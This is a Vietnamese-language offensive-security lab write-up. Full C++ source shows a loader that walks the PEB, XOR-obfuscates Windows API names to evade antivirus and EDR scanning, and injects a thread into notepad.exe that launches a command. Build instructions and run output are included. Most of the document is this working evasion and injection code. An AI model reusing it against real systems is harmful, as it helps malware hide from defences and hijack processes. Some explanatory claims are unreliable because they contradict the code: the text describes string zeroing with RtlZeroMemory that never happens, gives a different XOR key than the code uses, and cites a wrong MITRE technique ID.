
---

# 📝 [PE 18] PEB Walk and APIs Obfuscation (Cross-Process Hybrid Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**PEB Walk combined with API Obfuscation (Giải thuật phân giải ký hiệu động kết hợp mật mã hóa chuỗi cấu trúc)** đại diện cho mô hình phòng thủ đa lớp (Layered Defensive Bypass) ở phân hệ tầng sâu, thuộc nhóm kỹ thuật **Né tránh toàn diện phân tích tĩnh và dấu vết bộ nhớ ảo (Static/Memory Anti-Forensics Hybrid Evasion)**.

Nếu Loader chỉ áp dụng giải thuật PEB Walk đơn thuần (`PE 17`), các chuỗi văn bản thuần túy (Plain-text Strings) dùng để so khớp tên hàm vẫn hiện diện lọt lòng trong phân đoạn `.rdata` trên ổ đĩa hoặc để lộ trên bộ nhớ RAM. Các phân hệ trinh sát động của EDR (như Memory Dumping / Call Stack Integrity Check) có thể bốc tách các tham số chuỗi này tại thời điểm runtime để dựng lại bản đồ hành vi của mã độc.

Dự án PE 18 hóa giải triệt để điểm thắt nút trinh sát này bằng việc thiết lập ma trận bảo an kép (Dual-Layer Evasion Matrix):

1. **Triệt tiêu hoàn toàn Import Address Table (IAT)**: Loại bỏ sự xuất hiện của các hàm can thiệp RAM nhạy cảm (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) khỏi cấu trúc bảng Import tĩnh của file PE.
2. **Mật mã hóa cấu trúc Stack-string (Runtime XOR Decryption)**: Toàn bộ tên của các hàm API hệ thống và chuỗi lệnh điều hướng đều bị băm nát bằng giải thuật mã hóa đối xứng XOR với một khóa bí mật (Secret Key) ngay tại thời điểm compile. Chuỗi tự thô chỉ được giải mã ngược trong một tích lửng thời gian ngắn lọt lòng bộ đệm Cache CPU rồi lập tức bị ghi đè xóa dấu vết (`Zeroing Overwrite`), khiến cho cả cơ chế quét tĩnh (Static Scan) lẫn quét RAM động (Memory Dumping) đều hoàn toàn bất lực.

### 🎯 Mục tiêu nghiên cứu:

* **Bẻ gãy cơ chế Memory Dumping**: Chống lại giải pháp phân tích hành vi động thông qua việc xóa sạch dấu vết chuỗi giải mã ngay sau khi sử dụng.
* **Làm chủ ma trận Evasion lai (Hybrid Evasion)**: Kết hợp nhuần nhuyễn giải thuật duyệt cấu trúc hệ thống `PEB Walk x64` và cơ chế giải mã động tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi Loader kích hoạt chiến dịch can thiệp bộ nhớ chéo tiến trình, dòng chảy CPU được hệ điều hành Windows Subsystem điều phối ngầm qua cấu trúc ma trận 4 giai đoạn logic kịch khung:

```
[__readgsqword(0x60) -> Trích xuất PEB Object]
       └──> [XOR Decryption: Giải mã chuỗi tên API ngay trên CPU Stack Frame]
                 └──> [Giải phẫu thủ công EAT -> Trích xuất địa chỉ API tuyệt đối]
                           └──> [RtlZeroMemory: Xóa chuỗi thô khoi RAM -> Kích nổ chéo tiến trình]

```

1. **Khởi động giải thuật PEB Walk**: Loader truy cập trực tiếp vào thanh ghi phân đoạn phần cứng **`GS:[0x60]`** trên kiến trúc x64 để bốc tách cấu trúc bản ghi PEB, từ đó duyệt qua danh sách liên kết vòng tròn `InLoadOrderModuleList` để trích xuất địa chỉ Base Address sống của `kernel32.dll` trên bộ nhớ ảo.
2. **Thức tỉnh chuỗi ký tự bằng XOR (Runtime Decryption)**: Các mảng dữ liệu Hex vô nghĩa trên Stack Frame được đưa qua hàm giải mã XOR cục bộ với một hằng số khóa định sẵn (`XOR_KEY = 0x5A`) để tái tạo lại tên hàm thô (ví dụ: `"VirtualAllocEx"`) ngay tại bộ nhớ Cache của CPU tại thời điểm chạy.
3. **Phẫu thuật EAT và xóa sạch chỉ dấu bộ nhớ**: Loader tự đóng vai trò là một trình nạp PE thủ công, duyệt qua mảng chứa tên hàm xuất bản (`AddressOfNames`) của `kernel32.dll` để so khớp chuỗi vừa được giải mã. Ngay khi tính toán và trích xuất thành công địa chỉ tuyệt đối của các hàm hệ thống, ta gán trực tiếp vào các mẫu cấu trúc hàm động (Dynamic Function Pointers) và lập tức phát lệnh triệu hồi **`RtlZeroMemory`** để ghi đè toàn bộ byte `0x00` lên các chuỗi text thô vừa sinh ra, triệt tiêu hoàn toàn khả năng bị đánh dấu bởi các bộ Memory Dump Scanners.
4. **Tiêm chéo và kích nổ tiến trình ký sinh**: Sử dụng các con trỏ hàm phân giải ngầm để thực hiện chuỗi hành vi can thiệp bộ nhớ chéo tiến trình sang mục tiêu vỏ bọc (đường dẫn được định vị động qua API hệ thống), hoàn tất chu kỳ sống phẳng sạch tuyệt đối.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp: 
```cpp
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa thủ công cấu trúc Native của PEB để độc lập thư viện ngoài
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

// Định nghĩa mẫu con trỏ hàm hệ thống sẽ được bốc động
typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* WPMType)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemoteObfuscatedPebPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật toán học XOR hoàn nguyên chuỗi
void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    size_t j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

// Hàm giải mã động: Sử dụng mảng động std::string để tự giải phóng bộ đệm RAM an toàn
std::string DecryptString(unsigned char* encoded, size_t len, const char* key, size_t key_len) {
    std::vector<unsigned char> buffer(encoded, encoded + len);
    XOR(buffer.data(), len, key, key_len);
    return std::string(buffer.begin(), buffer.end());
}

// Giải thuật đào bới PEB tìm kiếm Base Address của Module trên RAM x64
HMODULE WalkPebToFindModule(const std::wstring& moduleName) {
    // ĐỘT PHÁ X64: Bốc thẳng địa chỉ cấu trúc PEB qua thanh ghi GS:[0x60]
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr) return NULL;

    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
    LIST_ENTRY* pListHead = &pPeb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* pCurrentLink = pListHead->Flink;

    while (pCurrentLink != pListHead) {
        pModuleEntry = CONTAINING_RECORD(pCurrentLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (pModuleEntry->BaseDllName.Buffer != NULL) {
            if (_wcsicmp(pModuleEntry->BaseDllName.Buffer, moduleName.c_str()) == 0) {
                return (HMODULE)pModuleEntry->DllBase;
            }
        }
        pCurrentLink = pCurrentLink->Flink;
    }
    return NULL;
}

// Giải phẫu xuất bản thủ công địa chỉ hàm từ Export Table của Module
PVOID GetProcAddressCustom(HMODULE hModule, const char* lpProcName) {
    PBYTE base = (PBYTE)hModule;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);

    DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRva == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
    DWORD* pAddresses = (DWORD*)(base + pExportDir->AddressOfFunctions);
    DWORD* pNames = (DWORD*)(base + pExportDir->AddressOfNames);
    WORD* pOrdinals = (WORD*)(base + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)(base + pNames[i]);
        if (strcmp(functionName, lpProcName) == 0) {
            return (PVOID)(base + pAddresses[pOrdinals[i]]);
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 18: PEB WALK & API OBFUSCATION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    const char* key = "offensivepanda";
    size_t k_len = strlen(key);

    // Duyệt PEB Walk tìm kiếm Base Address của Kernel32
    HMODULE k32baseAddr = WalkPebToFindModule(L"kernel32.dll");
    if (!k32baseAddr) return EXIT_FAILURE;
    std::cout << "[+] PEB Walk tim thay Kernel32 tai: 0x" << std::hex << k32baseAddr << std::endl;

    // ─── BƯỚC 2: GIẢI MÃ CHUỖI ĐỘNG VÀ BÓC TÁCH CON TRỎ HÀM TỪ EXPORT TABLE ───
    // Mảng byte mã hóa của GetProcAddress và LoadLibraryA
    unsigned char sGPA[] = { 0x28, 0x03, 0x12, 0x35, 0x1c, 0x1c, 0x0a, 0x37, 0x01, 0x14, 0x13, 0x0b, 0x17, 0x12 };
    unsigned char sLLA[] = { 0x23, 0x09, 0x07, 0x01, 0x22, 0x1a, 0x0b, 0x04, 0x04, 0x02, 0x18, 0x2f };

    std::string strGPA = DecryptString(sGPA, sizeof(sGPA), key, k_len);
    std::string strLLA = DecryptString(sLLA, sizeof(sLLA), key, k_len);

    // Giải phẫu bốc cấu trúc hàm qua tên vừa được giải mã sạch bóng tĩnh
    HMODULE hKernel32 = WalkPebToFindModule(L"kernel32.dll");
    fnWinExec pWinExec = (fnWinExec)GetProcAddressCustom(hKernel32, "WinExec");

    // Giải mã động các API tiêm chéo tiến trình
    unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
    unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
    unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };

    std::string strVAEx = DecryptString(sVAEx, sizeof(sVAEx), key, k_len);
    std::string strWPM = DecryptString(sWPM, sizeof(sWPM), key, k_len);
    std::string strCRT = DecryptString(sCRT, sizeof(sCRT), key, k_len);

    VAExType pVAEx = (VAExType)GetProcAddressCustom(hKernel32, strVAEx.c_str());
    WPMType pWPM = (WPMType)GetProcAddressCustom(hKernel32, strWPM.c_str());
    CRTType pCRT = (CRTType)GetProcAddressCustom(hKernel32, strCRT.c_str());

    if (!pVAEx || !pWPM || !pCRT || !pWinExec) {
        std::cerr << "[-] Khong the phan giai ham tu chuoi ma hoa!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Giai ma API Obfuscation va bock tach thanh cong tat ca cac ham." << std::endl;

    // ─── BƯỚC 3: KẾT NỐI VÀ THỰC THI TIÊM CHÉO BIÊN GIỚI ───
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = pVAEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = pVAEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat RAM tu xa an toan: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Cấu hình tham số tuyệt đối cục bộ
    THREAD_DATA localData;
    localData.pWinExec = pWinExec;
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic mã máy và dữ liệu sang RAM Notepad
    pWPM(hProcess, remoteCodeBuffer, (PVOID)RemoteObfuscatedPebPayload, functionSize, NULL);
    pWPM(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Nap va can bang x64 Stack Payload hoan tat." << std::endl;

    // Kích nổ luồng thực thi thông qua con trỏ hàm động đã được giấu chuỗi
    std::cout << "[*] Dang khoi tao CreateRemoteThread an toan..." << std::endl;
    HANDLE hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng dứt điểm phẳng sạch
        std::cout << "[+] PEB Walk & API Obfuscation Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // Thu hồi tài nguyên hệ thống phẳng sạch chống rò rỉ bộ nhớ
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân hoàn tất bẻ gãy mọi chữ ký tĩnh, loại bỏ hoàn toàn sự phụ thuộc vào các tệp liên kết động CRT khi triển khai sang môi trường Lab sạch:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường Lab, sau đó thực thi tệp tin Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận giải mã động:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE18_PEB_Walk_APIs_Obfuscation\x64\Release> C:\Users\Admin\source\repos\Task6\PE18_PEB_Walk_APIs_Obfuscation\x64\Release\PE18_PEB_Walk_APIs_Obfuscation.exe
====================================================
[*] PE 18: PEB WALK & API OBFUSCATION
====================================================
[+] Da tim thay Notepad.exe voi PID: 16828
[+] PEB Walk tim thay Kernel32 tai: 0x00007FF92B810000
[+] Giai ma API Obfuscation va bock tach thanh cong tat ca cac ham.
[+] Cap phat RAM tu xa an toan: 0x00000211945C0000
[+] Nap va can bang x64 Stack Payload hoan tat.<img width="1920" height="1140" alt="devenv_LWtYBiKOxk" src="https://github.com/user-attachments/assets/648af864-a592-49f7-ae3b-2a862de90c59" />

[*] Dang khoi tao CreateRemoteThread an toan...
[+] PEB Walk & API Obfuscation Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="1080" alt="devenv_LWtYBiKOxk" src="https://github.com/user-attachments/assets/cb42f2ed-004b-45fe-846c-40af77c719e7" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Subsystem Guide**: *Thread Environment Block (TEB) & GS Register Management on Windows x64* - Windows Architecture Reference.
* **Mật mã học ứng dụng trong Malware**: *Polymorphic and Obfuscated Code Generation via Symmetric XOR Ciphers* - Black Hat Research Papers.
* **EDR Bypass Methodologies**: *Defeating Memory Scanning and YARA Signature Matching via Runtime String Zeroing* - Defcon Conference Artifacts.
* **MITRE ATT&CK Framework**: *Defense Evasion: Obfuscated Files or Information (T1027)* & *Dynamic API Resolution (T1562)*.

---

